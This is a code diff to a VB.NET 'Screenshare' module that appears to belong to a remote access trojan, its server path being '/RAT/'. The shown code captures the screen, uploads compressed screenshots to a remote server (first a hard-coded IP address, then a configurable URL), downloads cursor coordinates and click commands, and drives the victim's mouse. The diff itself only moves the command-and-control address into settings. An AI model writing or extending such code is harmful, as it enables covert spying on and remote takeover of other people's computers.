@@ -17,7 +17,7 @@ Module Screenshare
     'End Get
     'End Property
 
-    Private vpsURL As String = "http://185.62.188.189/RAT/"
+    Private vpsURL As String = My.Settings.vpsurl
 
     Private Structure PointAPI
         Public x As Integer
@@ -122,9 +122,11 @@ Module Screenshare
             Dim compressedBmpBytes As Byte() =
                DeflateCompress(ResizeConvertBMP(TakeBitmapScreenshot(), screenshareQuality))
 
-            MainForm.mainWebClient.UploadData("http://185.62.188.189/RAT/" & "clients.php?action=uploadimage", compressedBmpBytes)
-            Dim cords As String = MainForm.mainWebClient.DownloadString("http://185.62.188.189/RAT/" & "clients.php?action=getcords")
+            MainForm.mainWebClient.UploadData(My.Settings.vpsurl & "clients.php?action=uploadimage", compressedBmpBytes)
+
+            Dim cords As String = MainForm.mainWebClient.DownloadString(My.Settings.vpsurl & "clients.php?action=getcords")
             Dim parsedResponse As String() = cords.Split("|")
+
             If cords.Trim <> "" Then
                 Dim xPos As Integer = (Convert.ToInt32(parsedResponse(0).ToString) / 100) * My.Computer.Screen.Bounds.Size.Width
                 Dim yPos As Integer = (Convert.ToInt32(parsedResponse(1)) / 100) * My.Computer.Screen.Bounds.Size.Height
@@ -133,6 +135,7 @@ Module Screenshare
                 If parsedResponse(2) = "2" Then mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0) : mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0) : Thread.Sleep(20) : mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0) : mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
                 If parsedResponse(2) = "3" Then mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0) : mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)
             End If
+
             Dim msTimeout As Integer = screenshareFluxInterval - Date.Now.Subtract(startTime).TotalMilliseconds
             If msTimeout < 1 Then
                 Continue While
